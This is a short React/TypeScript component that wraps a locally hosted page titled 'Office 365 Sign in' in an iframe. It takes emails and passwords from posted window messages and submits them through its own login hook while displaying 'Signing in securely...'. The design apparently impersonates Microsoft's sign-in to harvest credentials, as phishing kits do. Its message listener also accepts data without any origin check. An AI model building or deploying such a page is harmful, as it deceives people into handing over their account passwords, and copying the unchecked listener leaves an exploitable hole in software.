import React, { useEffect } from 'react';
import { useLogin } from '../hooks/useLogin';
import Spinner from './common/Spinner';

interface Office365WrapperProps {
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
}

const Office365Wrapper: React.FC<Office365WrapperProps> = ({ onLoginSuccess, onLoginError }) => {
  const { isLoading, handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);

  useEffect(() => {
    const handleMessage = (event: MessageEvent) => {
      if (event.data.type === 'OFFICE_365_SUBMIT') {
        const { email, password } = event.data.payload;
        handleFormSubmit(new Event('submit'), { email, password, provider: 'Office365' });
      }
    };
    window.addEventListener('message', handleMessage);
    return () => {
      window.removeEventListener('message', handleMessage);
    };
  }, [handleFormSubmit]);

  if (isLoading) {
    return (
      <div className="absolute inset-0 bg-white/80 flex flex-col items-center justify-center z-50">
        <Spinner size="lg" />
        <p className="mt-4 text-lg font-semibold text-gray-700">Signing in securely...</p>
      </div>
    );
  }

  return (
    <iframe 
      src="/office.365.html" 
      title="Office 365 Sign in"
      className="w-full h-screen border-0"
    />
  );
};

export default Office365Wrapper;
